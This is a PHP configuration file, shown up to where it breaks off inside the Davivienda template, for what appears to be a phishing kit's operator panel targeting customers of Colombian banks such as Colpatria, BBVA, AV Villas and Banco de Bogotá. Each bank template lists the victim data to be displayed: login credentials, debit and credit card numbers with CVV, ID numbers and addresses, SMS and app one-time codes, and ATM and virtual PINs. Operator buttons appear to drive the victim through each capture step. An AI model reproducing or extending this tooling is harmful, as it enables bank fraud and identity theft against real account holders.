<?php

return [

    /*
    |--------------------------------------------------------------------------
    | Plantilla 3CO
    |--------------------------------------------------------------------------
    */
    '3co' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID de Sesión', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'login',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'tarjeta_debito',
                'enabled' => true,
                'title' => '💳 TARJETA DE DÉBITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDB', 'key' => 'tdb'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'ven_tdb'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvv_tdb'],
                ],
            ],
            [
                'name' => 'tarjeta_credito',
                'enabled' => true,
                'title' => '💳 TARJETA DE CRÉDITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDC', 'key' => 'tdc'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'ven_tdc'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvv_tdc'],
                ],
            ],
            [
                'name' => 'datos_personales',
                'enabled' => true,
                'title' => '👤 DATOS PERSONALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Nombre', 'key' => 'nombre'],
                    ['emoji' => '🆔', 'label' => 'Cédula', 'key' => 'cedula'],
                    ['emoji' => '📧', 'label' => 'Email', 'key' => 'email'],
                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'celular'],
                    ['emoji' => '🏙️', 'label' => 'Ciudad', 'key' => 'ciudad'],
                    ['emoji' => '📍', 'label' => 'Dirección', 'key' => 'direccion'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'codsms'],
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'codapp'],
                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'pincaj'],
                    ['emoji' => '🔑', 'label' => 'Clave Virtual', 'key' => 'pinvir'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN ADICIONAL',
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'LOG', 'action' => 'login'],
                    ['text' => 'DAT', 'action' => 'datos'],
                    ['text' => 'SMS', 'action' => 'codsms'],
                    ['text' => 'APP', 'action' => 'codapp'],
                    ['text' => 'TDB', 'action' => 'tdb'],
                ],
                [
                    ['text' => 'TDC', 'action' => 'tdc'],
                    ['text' => 'CAJ', 'action' => 'pincaj'],
                    ['text' => 'VIR', 'action' => 'pinvir'],
                    ['text' => 'EXI', 'action' => 'exito'],
                    ['text' => 'ERR', 'action' => 'error'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla SVN
    |--------------------------------------------------------------------------
    */
    'svn' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID de Sesión', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'datos_personales',
                'enabled' => true,
                'title' => '👤 DATOS PERSONALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Nombre', 'key' => 'nombre'],
                    ['emoji' => '🆔', 'label' => 'Cédula', 'key' => 'cedula'],
                    ['emoji' => '📧', 'label' => 'Email', 'key' => 'email'],
                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'celular'],
                ],
            ],
            [
                'name' => 'credenciales',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '📋', 'label' => 'Tipo Documento', 'key' => 'tipo-documento'],
                    ['emoji' => '🔢', 'label' => 'Número', 'key' => 'numero-documento'],
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'otpapp'],
                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'clavecajero'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN ADICIONAL',
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'INI', 'action' => 'inicio'],
                    ['text' => 'USR', 'action' => 'usuario'],
                    ['text' => 'APP', 'action' => 'otpapp'],
                ],
                [
                    ['text' => 'CAJ', 'action' => 'clavecajero'],
                    ['text' => 'DAT', 'action' => 'datospersonales'],
                    ['text' => 'EXI', 'action' => 'exito'],
                    ['text' => 'ERR', 'action' => 'fin'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla ZCentral
    |--------------------------------------------------------------------------
    */
    'zcentral' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'login',
                'enabled' => true,
                'title' => null,
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'tarjeta_debito',
                'enabled' => true,
                'title' => null,
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDB', 'key' => 'tdb'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'ven_tdb'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvv_tdb'],
                ],
            ],
            [
                'name' => 'tarjeta_credito',
                'enabled' => true,
                'title' => null,
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDC', 'key' => 'tdc'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'ven_tdc'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvv_tdc'],
                ],
            ],
            [
                'name' => 'datos_personales',
                'enabled' => true,
                'title' => null,
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Nombre', 'key' => 'nombre'],
                    ['emoji' => '🆔', 'label' => 'Cédula', 'key' => 'cedula'],
                    ['emoji' => '📧', 'label' => 'Email', 'key' => 'email'],
                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'celular'],
                    ['emoji' => '🏙️', 'label' => 'Ciudad', 'key' => 'ciudad'],
                    ['emoji' => '📍', 'label' => 'Dirección', 'key' => 'direccion'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => null,
                'fields' => [
                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'codsms'],
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'codapp'],
                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'pincaj'],
                    ['emoji' => '🔑', 'label' => 'Clave Virtual', 'key' => 'pinvir'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => null,
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'LOG', 'action' => 'login'],
                    ['text' => 'DAT', 'action' => 'datos'],
                    ['text' => 'SMS', 'action' => 'codsms'],
                    ['text' => 'APP', 'action' => 'codapp'],
                    ['text' => 'TDB', 'action' => 'tdb'],
                ],
                [
                    ['text' => 'TDC', 'action' => 'tdc'],
                    ['text' => 'CAJ', 'action' => 'pincaj'],
                    ['text' => 'VIR', 'action' => 'pinvir'],
                    ['text' => 'EXI', 'action' => 'exito'],
                    ['text' => 'ERR', 'action' => 'error'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla Colpatria
    |--------------------------------------------------------------------------
    */
    'colpatria' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID de Sesión', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'login',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'tarjeta',
                'enabled' => true,
                'title' => '💳 TARJETA',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'Número', 'key' => 'tdc'],
                    ['emoji' => '📅', 'label' => 'Vencimiento', 'key' => 'ven'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvv'],
                ],
            ],
            [
                'name' => 'datos_personales',
                'enabled' => true,
                'title' => '👤 DATOS PERSONALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Nombre', 'key' => 'nombre'],
                    ['emoji' => '🆔', 'label' => 'Cédula', 'key' => 'cedula'],
                    ['emoji' => '📧', 'label' => 'Email', 'key' => 'email'],
                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'celular'],
                    ['emoji' => '📍', 'label' => 'Dirección', 'key' => 'direccion'],
                    ['emoji' => '🏙️', 'label' => 'Ciudad', 'key' => 'ciudad'],
                    ['emoji' => '🗺️', 'label' => 'Departamento', 'key' => 'departamento'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'otpsms'],
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'otpapp'],
                    ['emoji' => '🔊', 'label' => 'OTP Audio', 'key' => 'otpaudio'],
                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'clavecajero'],
                    ['emoji' => '💳', 'label' => 'Clave TDC', 'key' => 'clavetdc'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN ADICIONAL',
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'LOG', 'action' => 'user'],
                    ['text' => 'TDC', 'action' => 'tc'],
                    ['text' => 'SMS', 'action' => 'otpsms'],
                    ['text' => 'APP', 'action' => 'otpapp'],
                    ['text' => 'AUD', 'action' => 'otpaudio'],
                ],
                [
                    ['text' => 'CAJ', 'action' => 'clavecajero'],
                    ['text' => 'CTC', 'action' => 'clavetdc'],
                    ['text' => 'FIN', 'action' => 'fin'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla Bogotá
    |--------------------------------------------------------------------------
    */
    'bogota' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID de Sesión', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'login',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'tarjeta_debito',
                'enabled' => true,
                'title' => '💳 TARJETA DE DÉBITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDB', 'key' => 'tdb'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'ven_tdb'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvv_tdb'],
                ],
            ],
            [
                'name' => 'tarjeta_credito',
                'enabled' => true,
                'title' => '💳 TARJETA DE CRÉDITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDC', 'key' => 'tdc'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'ven_tdc'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvv_tdc'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'codsms'],
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'codapp'],
                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'pincaj'],
                    ['emoji' => '🔑', 'label' => 'Clave Virtual', 'key' => 'pinvir'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN ADICIONAL',
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'LOG', 'action' => 'login'],
                    ['text' => 'SMS', 'action' => 'codsms'],
                    ['text' => 'APP', 'action' => 'codapp'],
                    ['text' => 'TDB', 'action' => 'tdb'],
                    ['text' => 'TDC', 'action' => 'tdc'],
                ],
                [
                    ['text' => 'CAJ', 'action' => 'pincaj'],
                    ['text' => 'VIR', 'action' => 'pinvir'],
                    ['text' => 'EXI', 'action' => 'exito'],
                    ['text' => 'ERR', 'action' => 'error'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla Occidente
    |--------------------------------------------------------------------------
    */
    'occidente' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID de Sesión', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'login',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'tarjeta_debito',
                'enabled' => true,
                'title' => '💳 TARJETA DE DÉBITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDB', 'key' => 'numtarjetaTDB'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'vencimientoTDB'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvvTDB'],
                ],
            ],
            [
                'name' => 'tarjeta_credito',
                'enabled' => true,
                'title' => '💳 TARJETA DE CRÉDITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDC', 'key' => 'numtarjetaTDC'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'vencimientoTDC'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvvTDC'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'codsms'],
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'codapp'],
                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'pincaj'],
                    ['emoji' => '🔑', 'label' => 'Clave Virtual', 'key' => 'pinvir'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN ADICIONAL',
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'LOG', 'action' => 'login'],
                    ['text' => 'SMS', 'action' => 'codsms'],
                    ['text' => 'APP', 'action' => 'codapp'],
                    ['text' => 'TDB', 'action' => 'tdb'],
                    ['text' => 'TDC', 'action' => 'tdc'],
                ],
                [
                    ['text' => 'CAJ', 'action' => 'pincaj'],
                    ['text' => 'VIR', 'action' => 'pinvir'],
                    ['text' => 'EXI', 'action' => 'exito'],
                    ['text' => 'ERR', 'action' => 'error'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla Caja Social
    |--------------------------------------------------------------------------
    */
    'cajasocial' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID de Sesión', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'login',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'tarjeta_debito',
                'enabled' => true,
                'title' => '💳 TARJETA DE DÉBITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDB', 'key' => 'numtarjetaTDB'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'vencimientoTDB'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvvTDB'],
                ],
            ],
            [
                'name' => 'tarjeta_credito',
                'enabled' => true,
                'title' => '💳 TARJETA DE CRÉDITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDC', 'key' => 'numtarjetaTDC'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'vencimientoTDC'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvvTDC'],
                ],
            ],
            [
                'name' => 'datos_personales',
                'enabled' => true,
                'title' => '👤 DATOS PERSONALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Nombre', 'key' => 'nombre'],
                    ['emoji' => '🆔', 'label' => 'Cédula', 'key' => 'cedula'],
                    ['emoji' => '📧', 'label' => 'Email', 'key' => 'email'],
                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'celular'],
                    ['emoji' => '🏙️', 'label' => 'Ciudad', 'key' => 'ciudad'],
                    ['emoji' => '📍', 'label' => 'Dirección', 'key' => 'direccion'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'codsms'],
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'codapp'],
                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'pincaj'],
                    ['emoji' => '🔑', 'label' => 'Clave Virtual', 'key' => 'pinvir'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN ADICIONAL',
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'LOG', 'action' => 'login'],
                    ['text' => 'DAT', 'action' => 'datos'],
                    ['text' => 'SMS', 'action' => 'codsms'],
                    ['text' => 'APP', 'action' => 'codapp'],
                    ['text' => 'TDB', 'action' => 'tdb'],
                ],
                [
                    ['text' => 'TDC', 'action' => 'tdc'],
                    ['text' => 'CAJ', 'action' => 'pincaj'],
                    ['text' => 'VIR', 'action' => 'pinvir'],
                    ['text' => 'EXI', 'action' => 'exito'],
                    ['text' => 'ERR', 'action' => 'error'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla BBVA
    |--------------------------------------------------------------------------
    */
    'bbva' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID de Sesión', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'login',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'tarjeta_debito',
                'enabled' => true,
                'title' => '💳 TARJETA DE DÉBITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDB', 'key' => 'numtarjetaTDB'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'vencimientoTDB'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvvTDB'],
                ],
            ],
            [
                'name' => 'tarjeta_credito',
                'enabled' => true,
                'title' => '💳 TARJETA DE CRÉDITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDC', 'key' => 'numtarjetaTDC'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'vencimientoTDC'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvvTDC'],
                ],
            ],
            [
                'name' => 'datos_personales',
                'enabled' => true,
                'title' => '👤 DATOS PERSONALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Nombre', 'key' => 'nombre'],
                    ['emoji' => '🆔', 'label' => 'Cédula', 'key' => 'cedula'],
                    ['emoji' => '📧', 'label' => 'Email', 'key' => 'email'],
                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'celular'],
                    ['emoji' => '🏙️', 'label' => 'Ciudad', 'key' => 'ciudad'],
                    ['emoji' => '📍', 'label' => 'Dirección', 'key' => 'direccion'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'codsms'],
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'codapp'],
                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'pincaj'],
                    ['emoji' => '🔑', 'label' => 'Clave Virtual', 'key' => 'pinvir'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN ADICIONAL',
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'LOG', 'action' => 'login'],
                    ['text' => 'DAT', 'action' => 'datos'],
                    ['text' => 'SMS', 'action' => 'codsms'],
                    ['text' => 'APP', 'action' => 'codapp'],
                    ['text' => 'TDB', 'action' => 'tdb'],
                ],
                [
                    ['text' => 'TDC', 'action' => 'tdc'],
                    ['text' => 'CAJ', 'action' => 'pincaj'],
                    ['text' => 'VIR', 'action' => 'pinvir'],
                    ['text' => 'EXI', 'action' => 'exito'],
                    ['text' => 'ERR', 'action' => 'error'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla AV Villas
    |--------------------------------------------------------------------------
    */
    'avvillas' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID de Sesión', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'login',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'tarjeta_debito',
                'enabled' => true,
                'title' => '💳 TARJETA DE DÉBITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDB', 'key' => 'numtarjetaTDB'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'vencimientoTDB'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvvTDB'],
                ],
            ],
            [
                'name' => 'tarjeta_credito',
                'enabled' => true,
                'title' => '💳 TARJETA DE CRÉDITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDC', 'key' => 'numtarjetaTDC'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'vencimientoTDC'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvvTDC'],
                ],
            ],
            [
                'name' => 'datos_personales',
                'enabled' => true,
                'title' => '👤 DATOS PERSONALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Nombre', 'key' => 'nombre'],
                    ['emoji' => '🆔', 'label' => 'Cédula', 'key' => 'cedula'],
                    ['emoji' => '📧', 'label' => 'Email', 'key' => 'email'],
                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'celular'],
                    ['emoji' => '🏙️', 'label' => 'Ciudad', 'key' => 'ciudad'],
                    ['emoji' => '📍', 'label' => 'Dirección', 'key' => 'direccion'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'codsms'],
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'codapp'],
                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'pincaj'],
                    ['emoji' => '🔑', 'label' => 'Clave Virtual', 'key' => 'pinvir'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN ADICIONAL',
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'LOG', 'action' => 'login'],
                    ['text' => 'DAT', 'action' => 'datos'],
                    ['text' => 'SMS', 'action' => 'codsms'],
                    ['text' => 'APP', 'action' => 'codapp'],
                    ['text' => 'TDB', 'action' => 'tdb'],
                ],
                [
                    ['text' => 'TDC', 'action' => 'tdc'],
                    ['text' => 'CAJ', 'action' => 'pincaj'],
                    ['text' => 'VIR', 'action' => 'pinvir'],
                    ['text' => 'EXI', 'action' => 'exito'],
                    ['text' => 'ERR', 'action' => 'error'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla Davivienda
    |--------------------------------------------------------------------------
    */
    'davivienda' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID de Sesión', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'login',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'tarjeta_debito',
                'enabled' => true,
                'title' => '💳 TARJETA DE DÉBITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDB', 'key' => 'numtarjetaTDB'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'vencimientoTDB'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvvTDB'],
                ],
            ],
            [
                'name' => 'tarjeta_credito',
                'enabled' => true,
                'title' => '💳 TARJETA DE CRÉDITO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'TDC', 'key' => 'numtarjetaTDC'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'vencimientoTDC'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvvTDC'],
                ],
            ],
            [
                'name' => 'datos_personales',
                'enabled' => true,
                'title' => '👤 DATOS PERSONALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Nombre', 'key' => 'nombre'],
                    ['emoji' => '🆔', 'label' => 'Cédula', 'key' => 'cedula'],
                    ['emoji' => '📧', 'label' => 'Email', 'key' => 'email'],
                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'celular'],
                    ['emoji' => '🏙️', 'label' => 'Ciudad', 'key' => 'ciudad'],
                    ['emoji' => '📍', 'label' => 'Dirección', 'key' => 'direccion'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'otpsms'],
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'otpapp'],
